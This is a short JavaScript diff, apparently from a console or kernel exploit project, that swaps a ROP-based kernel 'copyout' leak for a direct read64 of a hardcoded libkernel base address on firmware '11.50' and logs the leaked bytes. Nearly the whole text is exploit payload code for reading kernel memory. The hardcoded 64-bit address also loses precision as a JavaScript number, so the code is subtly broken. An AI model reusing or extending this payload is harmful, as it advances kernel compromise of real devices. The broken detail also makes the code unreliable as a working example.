@@ -1,14 +1,11 @@
+let read_target = new Uint8Array(8); // Kernel will copy 8 bytes here
+
 function run_payload() {
-  debug_log(\"Running payload: copyout test...\");
+  debug_log("Payload starting...");
 
-  const rop = setupROP();
+  // Run a test read from libkernel base
+  const addr = 0xFFFFFFFF82600000; // libkernel base (known on 11.50)
+  const val = read64(addr);
 
-  setTimeout(() => {
-    // JS buffer should contain copied kernel bytes at offset 0x300
-    const leakOffset = 0x300 / 4;
-    const leaked_lo = rop[leakOffset];
-    const leaked_hi = rop[leakOffset + 1];
-
-    debug_log(\"Leaked kernel bytes: 0x\" + leaked_hi.toString(16).padStart(8, '0') + leaked_lo.toString(16).padStart(8, '0'));
-  }, 300);
+  debug_log("read64(libkernel base): 0x" + val.toString(16));
 }
